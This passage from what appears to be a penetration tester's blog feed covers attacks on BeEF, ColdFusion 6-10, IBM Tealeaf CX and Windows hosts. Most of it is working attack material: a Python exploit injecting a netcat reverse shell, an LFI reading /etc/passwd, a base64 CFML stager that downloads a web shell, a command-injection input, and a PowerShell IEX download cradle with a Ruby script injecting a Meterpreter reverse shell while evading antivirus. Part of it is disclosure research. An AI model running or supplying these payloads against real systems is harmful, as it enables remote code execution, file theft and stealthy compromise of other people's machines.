</span><span class='line'>        print 'Could not get auth token'
</span><span class='line'>        sys.exit(1)
</span><span class='line'>
</span><span class='line'>    url = 'http://%s:3000/api/dns/rule?token=%s' % (ip, token)
</span><span class='line'>    sploit = '%x(nc 192.168.1.97 4455 -e /bin/bash)'
</span><span class='line'>
</span><span class='line'>    headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
</span><span class='line'>    data = { 'pattern' : sploit,
</span><span class='line'>             'type' : 'A',
</span><span class='line'>             'response' : [ '127.0.0.1' ]
</span><span class='line'>           }
</span><span class='line'>
</span><span class='line'>    response = requests.post(url, headers=headers, data=json.dumps(data))
</span><span class='line'>    print response.status_code
</span><span class='line'>except Exception, e:
</span><span class='line'>    print e
</span></code></pre></td></tr></table></div></figure>


<p>You could execute ruby to grab a shell, but BeEF restricts some of the functions we can use (such as exec or system).</p>

<p>There&rsquo;s also an instance of LFI, this time using the server API.  <code>/api/server/bind</code> allows us to mount files at the root of the BeEF web server.  The path defaults to the current path, but can be traversed out of:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>def run_lfi(ip, token):
</span><span class='line'>    url = 'http://%s:3000/api/server/bind?token=%s' % (ip, token)
</span><span class='line'>    headers = { 'Content-Type' : 'application/json'}
</span><span class='line'>    data = { 'mount' : "/tmp.txt",
</span><span class='line'>             'local_file' : "/../../../etc/passwd"
</span><span class='line'>           }
</span><span class='line'>
</span><span class='line'>    response = requests.post(url, headers=headers, data=json.dumps(data))
</span><span class='line'>    print response.status_code</span></code></pre></td></tr></table></div></figure>


<p>We can then hit our server at /tmp.txt for <code>/etc/passwd</code>.  Though this appears to be intended behavior, and perhaps labeling it an LFI is a misnomer, it is still yet another example of why you should <em>not</em> expose these tools externally with default credentials.  Default credentials are just bad, period.  Stop it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFI to shell in Coldfusion 6-10]]></title>
    <link href="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/"/>
    <updated>2014-04-02T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion</id>
    <content type="html"><![CDATA[<p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>

<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>

<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en</span></code></pre></td></tr></table></div></figure>


<p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log.jpg"></p>

<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>

<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;</span></code></pre></td></tr></table></div></figure>


<p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>

<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log_fetch.jpg"></p>

<p>Which we can then access from the root directory:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log_exec.jpg"></p>

<p>A quick run of this in clusterd:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 --deployer lfi_stager --deploy ./src/lib/resources/cmd.cfml 
</span><span class='line'>
</span><span class='line'>        clusterd/0.2.1 - clustered attack toolkit
</span><span class='line'>            [Supporting 5 platforms]
</span><span class='line'>
</span><span class='line'> [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
</span><span class='line'> [2014-04-02 11:28PM] Servers' OS hinted at windows
</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-04-02 11:28PM] Server hinted at 'coldfusion'
</span><span class='line'> [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager...
</span><span class='line'> [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
</span><span class='line'> [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting completed.
</span><span class='line'> [2014-04-02 11:28PM] Injecting stager...
</span><span class='line'> [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
</span><span class='line'> [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
</span><span class='line'> [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM
</span></code></pre></td></tr></table></div></figure>


<p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>

<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI]]></title>
    <link href="http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/"/>
    <updated>2014-03-26T22:51:11-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi</id>
    <content type="html"><![CDATA[<p>Tealeaf Technologies was <a href="http://techcrunch.com/2012/05/02/ibm-acquires-tealeaf-to-add-customer-buying-analytics-to-smarter-commerce-products/">purchased</a> by IBM in May of 2012, and is a customer buying analytics application.  Essentially, an administrator will configure a Tealeaf server that accepts analytic data from remote servers, which it then generates various models, graphs, reports, etc based on the aggregate of data.
Their analytics status/server monitoring application is vulnerable to a fairly trivial OS command injection vulnerability, as well as local file inclusion.  This vulnerability was discovered on a PCI engagement against a large retailer; the LFI was used to pull PHP files and hunt for RCE.</p>

<p>The entire application is served up by default on port 8080 and is developed in PHP.  Authentication by default is disabled, however, support for Basic Auth appears to exist.  This interface allows administrators access to statistics, logs, participating servers, and more.  Contained therein is the ability to obtain application logs, such as configuration, maintenance, access, and more.  The log parameter is vulnerable to LFI:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(array_key_exists("log", $params))
</span><span class='line'>$path = $config-&gt;logfiledir() . "/" . $params["log"];
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>$file = basename($path);
</span><span class='line'>$size = filesize($path);
</span><span class='line'>
</span><span class='line'>// Set the cache-control and expiration date so that the file expires
</span><span class='line'>// immediately after download.
</span><span class='line'>//
</span><span class='line'>$rfc1123date = gmdate('D, d M Y H:i:s T', 1);
</span><span class='line'>header('Cache-Control: max-age=0, must-revalidate, post-check=0, pre-check=0');
</span><span class='line'>header("Expires: " . $rfc1123date);
</span><span class='line'>
</span><span class='line'>header("Content-Type: application/octet-stream");
</span><span class='line'>header("Content-Disposition: attachment; filename=$file;");
</span><span class='line'>header("Content-Length: $size;");
</span><span class='line'>
</span><span class='line'>readfile($path);</span></code></pre></td></tr></table></div></figure>


<p>The URL then is <code>http://host:8080/download.php?log=../../../etc/passwd</code></p>

<p>Tealeaf also suffers from a rather trivial remote OS command injection vulnerability.  Under the Delivery tab, there exists the option to ping remote servers that send data back to the mothership.  Do you see where this is going?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if ($_POST["perform_action"] == "testconn") {
</span><span class='line'>    $host = $_POST["testconn_host"];
</span><span class='line'>    $port = $_POST["testconn_port"];
</span><span class='line'>    $use_t = strtolower($_POST["testconn_t"]) == "true" ? true : false;
</span><span class='line'>    $command = $GLOBALS["config"]-&gt;testconn_program() . ' ';
</span><span class='line'>    if($use_t)
</span><span class='line'>    $output = trim(shell_command_output($command . $host . " -p " . $port . " -t"));
</span><span class='line'>    else
</span><span class='line'>    $output = trim(shell_command_output($command . $host . " -p " . $port));
</span><span class='line'>
</span><span class='line'>    if($output != "") {
</span><span class='line'>        $alert_function = "alert('" . str_replace("\n", "\\n",
</span><span class='line'>        htmlentities($output, ENT_QUOTES)) . "')";
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    $_SESSION['delivery']-&gt;pending_changes = $orig_pending_changes;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>And shell_command_output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function shell_command_output($command) {
</span><span class='line'>    $result = `$command 2&gt;&1`;
</span><span class='line'>    if (strlen($result) &gt; 0)
</span><span class='line'>    return $result;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Harnessing the <code>$host</code> variable, we can inject arbitrary commands to run under the context of the process user, which by default is <code>ctccap</code>.  In order to exploit this without hanging processes or goofing up flow, I injected the following as the host variable: <code>8.8.8.8 -c 1 ; whoami ; ping 8.8.8.8 -c 1</code>.</p>

<h3>Timeline</h3>


<ul>
<li>11/08/2013: IBM vulnerability submitted</li>
<li>11/09/2013: IBM acknowledge vulnerability and assign internal advisory ID</li>
<li>12/05/2013: Request for status update</li>
<li>01/06/2014: Second request for status update</li>
<li>01/23/2014: IBM responds with a target patch date set for &ldquo;another few months&rdquo;</li>
<li>03/26/2014: IBM posts advisory, assigns CVE-2013-6719 and CVE-2013-6720</li>
</ul>


<p><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667630">Advisory</a><br/>
<a href="http://www.exploit-db.com/exploits/32546/">exploit-db PoC</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[meterpreter shell upgrades using powershell]]></title>
    <link href="http://hatRiot.github.io/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/"/>
    <updated>2014-03-10T21:31:47-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell</id>
    <content type="html"><![CDATA[<p>One of my primary goals during development of <a href="https://github.com/hatRiot/clusterd">clusterd</a> was ensuring reliability and covertness during remote deploys.  It&rsquo;s no secret that antivirus routinely eats vanilla meterpreter shells.  For this, the <code>--gen-payload</code> flag generates a war file with <code>java/jsp_shell_reverse_tcp</code> tucked inside.  This is used due to it being largely undetected by AV, and our environments are perfectly suited for it.  However, Meterpreter is a fantastic piece of software, and it&rsquo;d be nice to be able to elevate from this simple JSP shell into it.</p>

<p>Metasploit has a solution for this, sort of.  <code>sessions -u</code> can be used to upgrade an existing shell session into a full-blown Meterpreter.  Unfortunately, the current implementation uses <code>Rex::Exploitation::CmdStagerVBS</code>, which writes the executable to disk and executes it.  This is almost always immediately popped by most enterprise-grade (and even most consumer grade) AV&rsquo;s.  For this, we need a new solution.</p>

<p>The easiest solution is Powershell; this allows us to execute shellcode completely in-memory, without ever bouncing files against disk.  I used Obscure Security&rsquo;s canonical <a href="http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html">post</a> on it for my implementation.  The only problem really is portability, as Powershell doesn&rsquo;t exist on Windows XP.  This could be mitigated by patching in shellcode via Java, but that&rsquo;s another post for another time.</p>

<p>Right, so how&rsquo;s this work?  We essentially execute a Powershell command in the running session (our generic shell) that fetches a payload from a remote server and executes it.  Our payload in this case is <a href="https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1">Invoke-Shellcode</a>, from the PowerSploit package.  This bit of code will generate our reverse HTTPS meterpreter shell and inject it into the current process ID.  Our command looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc %s"</span></code></pre></td></tr></table></div></figure>


<p>Our encoded payload is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')</span></code></pre></td></tr></table></div></figure>


<p>IEX, or Invoke-Expression, is just an eval operation.  In this case, we&rsquo;re fetching a URL and executing it.  This is a totally transparent, completely in-memory solution.  Let&rsquo;s have a look at it running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; sessions -l
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type         Information                                                                       Connection
</span><span class='line'>  --  ----         -----------                                                                       ----------
</span><span class='line'>  1   shell linux  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  192.168.1.6:4444 -&gt; 192.168.1.102:60911 (192.168.1.102)
</span><span class='line'>
</span><span class='line'>msf exploit(handler) &gt; </span></code></pre></td></tr></table></div></figure>


<p>We see above that we currently have a generic shell (it&rsquo;s the java/jsp_shell_reverse_tcp payload) on a Windows 7 system (which happens to be running MSE).  Using this new script, we can upgrade this session to Meterpreter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; sessions -u 1
</span><span class='line'>
</span><span class='line'>[*] Started HTTPS reverse handler on https://0.0.0.0:53568/
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] 192.168.1.102:60922 Request received for /INITM...
</span><span class='line'>[*] 192.168.1.102:60922 Staging connection for target /INITM received...
</span><span class='line'>[*] Patched user-agent at offset 663128...
</span><span class='line'>[*] Patched transport at offset 662792...
</span><span class='line'>[*] Patched URL at offset 662856...
</span><span class='line'>[*] Patched Expiration Timeout at offset 663728...
</span><span class='line'>[*] Patched Communication Timeout at offset 663732...
</span><span class='line'>[*] Meterpreter session 2 opened (192.168.1.6:53568 -&gt; 192.168.1.102:60922) at 2014-03-11 23:09:36 -0600
</span><span class='line'>msf exploit(handler) &gt; sessions -i 2
</span><span class='line'>[*] Starting interaction with 2...
</span><span class='line'>
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer        : BRYAN-PC
</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
</span><span class='line'>Architecture    : x64 (Current Process is WOW64)
</span><span class='line'>System Language : en_US
</span><span class='line'>Meterpreter     : x86/win32
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<p>And just like that, without a peep from MSE, we&rsquo;ve got a Meterpreter shell.</p>

<p>You can find the code for this implementation below, though be warned; this is PoC quality code, and probably even worse as I&rsquo;m not really a Ruby developer.  Meatballs over at Metasploit has a few awesome Powershell pull requests waiting for a merge.  Once this is done, I can implement that here and submit a proper implementation.  If you&rsquo;d like to try this out, simply create a backup copy of <code>scripts/shell/spawn_meterpreter.rb</code> and copy in the following, then <code>reload</code>.  You should be upgradin&#8217; and bypassin&#8217; in no time.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#
</span><span class='line'># Session upgrade using Powershell IEX
</span><span class='line'># 
</span><span class='line'># Some code stolen from jduck's original implementation
</span><span class='line'>#
</span><span class='line'># -drone
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>class HTTPServer
</span><span class='line'>    #
</span><span class='line'>    # Using Ruby HTTPServer here since this isn't a module, and I can't figure
</span><span class='line'>    # out how to use MSF libs in here
</span><span class='line'>    #
</span><span class='line'>    @sent = false
</span><span class='line'>    def state
</span><span class='line'>        return @sent
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    def initialize(port, body)
</span><span class='line'>        require 'socket'
</span><span class='line'>
</span><span class='line'>        @sent = false
</span><span class='line'>        @server = Thread.new do
</span><span class='line'>            server = TCPServer.open port
</span><span class='line'>            loop do
</span><span class='line'>                client = server.accept
</span><span class='line'>                content_type = "text/plain"
</span><span class='line'>                client.puts "HTTP/1.0 200 OK\r\nContent-type: #{content_type}"\
</span><span class='line'>                            "\r\nContent-Length: #{body.length}\r\n\r\n#{body}"\
</span><span class='line'>                            "\r\n\r\n"
</span><span class='line'>                sleep 5
</span><span class='line'>                client.close
</span><span class='line'>                kill
</span><span class='line'>            end
</span><span class='line'>        end
</span><span class='line'>     end
</span><span class='line'>
</span><span class='line'>     def kill!
</span><span class='line'>        @sent = true
</span><span class='line'>        @server.kill
</span><span class='line'>     end
</span><span class='line'>
</span><span class='line'>     alias :kill :kill!
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Returns if a port is used by a session
</span><span class='line'>#
</span><span class='line'>def is_port_used?(port)
</span><span class='line'>    framework.sessions.each do |sid, obj|
</span><span class='line'>       local_info = obj.instance_variable_get(:@local_info)
</span><span class='line'>       return true if local_info =~ /:#{port}$/
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    false
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def start_http_service(port)
</span><span class='line'>    @server = HTTPServer.new(port, @pl)
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def wait_payload
</span><span class='line'>
</span><span class='line'>    waited = 0
</span><span class='line'>    while (not @server.state)
</span><span class='line'>        select(nil, nil, nil, 1)
</span><span class='line'>        waited += 1
</span><span class='line'>        if (waited &gt; 10) # MAGIC NUMBA
</span><span class='line'>            @server.kill
</span><span class='line'>            raise RuntimeError, "No payload requested"
</span><span class='line'>        end
</span><span class='line'>    end
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def generate(host, port, sport)
</span><span class='line'>    require 'net/http'
</span><span class='line'>
</span><span class='line'>    script_block = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')" % [host, sport]
</span><span class='line'>    cmd = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol %s" % script_block
</span><span class='line'>
</span><span class='line'>    # generate powershell payload
</span><span class='line'>    url = URI.parse('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
</span><span class='line'>    req = Net::HTTP::Get.new(url.path)
</span><span class='line'>    http = Net::HTTP.new(url.host, url.port)
</span><span class='line'>    http.use_ssl = true
</span><span class='line'>
</span><span class='line'>    res = http.request(req)
</span><span class='line'>
</span><span class='line'>    if !res or res.code != '200'
</span><span class='line'>      raise RuntimeError, "Could not retrieve Invoke-Shellcode"
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    @pl = res.body
</span><span class='line'>    @pl &lt;&lt; "\nInvoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force" % [host, port]
</span><span class='line'>    return cmd
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Mimics what MSF already does if the user doesn't manually select a payload and lhost
</span><span class='line'>#
</span><span class='line'>lhost = framework.datastore['LHOST']
</span><span class='line'>unless lhost
</span><span class='line'>  lhost = Rex::Socket.source_address
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># If there is no LPORT defined in framework, then pick a random one that's not used
</span><span class='line'># by current sessions. This is possible if the user assumes module datastore options
</span><span class='line'># are the same as framework datastore options.
</span><span class='line'>#
</span><span class='line'>lport = framework.datastore['LPORT']
</span><span class='line'>unless lport
</span><span class='line'>  lport = 4444 # Default meterpreter port
</span><span class='line'>  while is_port_used?(lport)
</span><span class='line'>    # Pick a port that's not used
</span><span class='line'>    lport = [*49152..65535].sample
</span><span class='line'>  end
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'># do the same from above, but for the server port
</span><span class='line'>sport = [*49152..65535].sample
</span><span class='line'>while is_port_used?(sport)
</span><span class='line'>    sport = [*49152..65535].sample
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'># maybe we want our sessions going to another instance?
</span><span class='line'>use_handler = true
